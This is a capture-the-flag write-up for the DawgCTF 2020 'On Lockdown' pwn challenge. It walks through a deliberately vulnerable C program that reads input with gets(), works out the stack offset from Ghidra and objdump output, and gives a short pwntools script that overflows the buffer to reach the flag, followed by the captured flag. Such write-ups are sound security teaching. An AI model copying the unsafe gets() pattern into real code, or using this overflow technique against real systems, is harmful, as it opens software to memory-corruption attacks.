# DawgCTF 2020

## On Lockdown

> 50
>
> Better than locked up I guess
>
> `nc ctf.umbccd.io 4500`
> 
> Author: trashcanna
> 
> [onlockdown](onlockdown) [onlockdown.c](onlockdown.c)

Tags: _pwn_


### Analysis

#### Checksec

```
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Most mitigations in place, however can smash stack, ROP, buffer overflow, but no GOT.


#### Source Included!

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void flag_me(){
    system("cat flag.txt");
}

void lockdown(){
    int lock = 0;
    char buf[64];
    printf("I made this really cool flag but Governor Hogan put it on lockdown\n");
    printf("Can you convince him to give it to you?\n");
    gets(buf);
    if(lock == 0xdeadbabe){
        flag_me();
    }else{
        printf("I am no longer asking. Give me the flag!\n");
    }
}

int main(){
    lockdown();
    return 0;
}
```

Just need to set `lock` to `0xdeadbabe`.

But wait, from Ghidra:

```
void lockdown(void)

{
  char local_50 [64];
  int local_10;
  
  local_10 = 0;
  puts("I made this really cool flag but Governor Hogan put it on lockdown");
  puts("Can you convince him to give it to you?");
  gets(local_50);
  if (local_10 == 0) {
    puts("I am no longer asking. Give me the flag!");
  }
  else {
    flag_me();
  }
  return;
}
```

And `objdump`:

```
    1230:	83 7d f4 00          	cmp    DWORD PTR [ebp-0xc],0x0
    1234:	74 07                	je     123d <lockdown+0x59>
    1236:	e8 7e ff ff ff       	call   11b9 <flag_me>
    123b:	eb 12                	jmp    124f <lockdown+0x6b>
```

`lock` just has to be non-zero!  You can accidentally solve this by blasting a lot of anything.

There is clearly a buffer overflow: `gets(local_50)`.  `local_50` is 76 bytes above EBP: 

```
00011224 8d 45 b4        LEA        EAX=>local_50,[EBP + -0x4c]
```

`local_10` is 12 (`[ebp-0xc]`) bytes above EBP, so sending 64 (76-12) bytes + 4 bytes will set `local_10`.


### Exploit

```
from pwn import *

p = process('./onlockdown')
#p = remote('ctf.umbccd.io', 4500)

p.recvuntil('you?\n')

payload  = 64 * b'A'
payload += 4 * b'A'

p.sendline(payload)
p.stream()
```

#### Output

```
[+] Opening connection to ctf.umbccd.io on port 4500: Done
DawgCTF{s3ri0u$ly_st@y_h0m3}
```

#### Flag

```
DawgCTF{s3ri0u$ly_st@y_h0m3}
```
